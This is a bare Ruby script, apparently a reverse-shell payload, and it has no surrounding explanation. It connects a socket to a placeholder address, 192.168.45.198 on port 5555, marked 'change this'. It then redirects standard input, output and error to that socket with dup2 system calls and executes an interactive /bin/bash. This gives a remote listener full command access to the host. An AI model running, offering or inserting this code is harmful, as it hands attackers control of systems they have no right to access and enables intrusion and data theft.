require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 5555, '192.168.45.198'   #change this

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/bash -i'
